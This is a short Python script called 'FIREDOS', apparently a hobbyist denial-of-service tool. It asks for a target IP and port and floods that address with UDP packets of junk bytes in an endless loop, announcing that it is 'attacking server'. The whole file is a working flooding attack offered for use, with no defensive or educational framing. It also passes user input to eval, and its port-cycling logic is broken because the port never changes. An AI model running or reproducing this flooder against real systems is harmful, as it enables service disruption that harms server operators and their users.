import socket
import requests
import time
import random

banner = """8888888888 8888888 8888888b.  8888888888 8888888b.   .d88888b.   .d8888b.  
888          888   888   Y88b 888        888  "Y88b d88P" "Y88b d88P  Y88b 
888          888   888    888 888        888    888 888     888 Y88b.      
8888888      888   888   d88P 8888888    888    888 888     888  "Y888b.   
888          888   8888888P"  888        888    888 888     888     "Y88b. 
888          888   888 T88b   888        888    888 888     888       "888 
888          888   888  T88b  888        888  .d88P Y88b. .d88P Y88b  d88P 
888        8888888 888   T88b 8888888888 8888888P"   "Y88888P"   "Y8888P"  
                                                                           
                                                                           
                                                                           """
print (banner)

ip = input(" [+] Target IP : ")
port = eval(input(" [+] Starting Port NO : "))

print (' LOADING  (CODED BY RAUFFJ)')

bytes_data = b'!!@@@###$$%$^%$^%&^*&*(*))_+)+_{:GHCNFGBV><<?><GHFHW%$^$%^#@$@#$@#$#$@#$@#$@#$@#!#@!@#QWdsafcdsvfdgFGHHJ:"IKLGJKL::?:J:PO{}aqsx'

print(" ")
print("    That's my secret Cap, I am always angry ")
print(" " )
print(" [+] FIREDOS is attacking server " + ip )
print (" " )
time.sleep(1)
sent = 0


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    while True:
        sock.sendto(bytes_data, (ip, port))
        sent = sent + 1
        print("\n [+] Successfully sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1
except KeyboardInterrupt:
    print("\n [+] Attack stopped by user.")
finally:
    sock.close()
